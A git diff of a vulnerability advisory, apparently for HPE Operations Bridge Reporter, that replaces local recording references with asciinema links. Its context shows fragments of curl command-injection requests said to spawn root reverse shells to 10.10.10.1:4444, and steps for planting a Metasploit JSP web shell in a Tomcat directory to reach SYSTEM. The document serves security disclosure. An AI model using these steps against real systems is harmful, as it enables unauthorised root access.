@@ -349,7 +349,9 @@ curl -i -s -k -X $'POST' \
     $'https://10.10.10.123:21412/AdminService/urest/v1/LogonResource'
 ```
 
-This will spawn a reverse shell running as root that will connect to 10.10.10.1:4444. The *casts/cmd_inj_1.cast* file contains an asciinema cast showing the "exploit" in action.
+This will spawn a reverse shell running as root that will connect to 10.10.10.1:4444. 
+You can view the attack in full glory in this asciinema cast:
+[![asciicast](https://asciinema.org/a/395851.svg)](https://asciinema.org/a/395851)
 
 #### 1.2: Command Injection via *logout*
 * [ZDI-21-154](https://www.zerodayinitiative.com/advisories/ZDI-21-154/)
@@ -547,7 +549,10 @@ curl -i -s -k -X $'DELETE' \
     $'https://mfobr.nat:21412/AdminService/urest/v1/LogonResource'
 ```
 
-As last time, this will spawn a root reverse shell to 10.10.10.1:4444. The *casts/cmd_inj_2.cast* file contains an asciinema cast showing the "exploit" in action.
+As last time, this will spawn a root reverse shell to 10.10.10.1:4444.
+
+You can view the attack in full glory in this asciinema cast:
+[![asciicast](https://asciinema.org/a/395852.svg)](https://asciinema.org/a/395852)
 
 
 #### 1.3: Command Injection in *logonWithCertificate()*
@@ -986,14 +991,10 @@ From here on, privilege escalation from "normal" user to SYSTEM is trivial:
 1. Login as a "normal" User (or Guest) to the Windows instance where OBR is installed
 2. Create a JSP web shell in Metasploit and start exploit/multi/handler to receive it
 3. Copy the web shell to one of the Tomcat webapps directories (such as C:\HPE-OBR\PMDB\BOWebServer\webapps\BI\shell.jsp)
-4. Access the shell path on the web server (https://TARGET:8443/BI/shell.jsp
+4. Access the shell path on the web server (https://TARGET:8443/BI/shell.jsp)
 5. Receive the SYSTEM shell in Metasploit and enjoy!
 
-The video below shows the full chain in action:
-
-<video width="960" height="540" controls>
-  <source src="media/privesc_win_obr.mp4" type="video/mp4">
-</video>
+[Click here for a video that shows the full chain in action](media/privesc_win_obr.mp4).
 
 Note that unlike what will be described for Linux, there is no mention on the documentation that these special folder permissions are set and that they need to be changed.
 
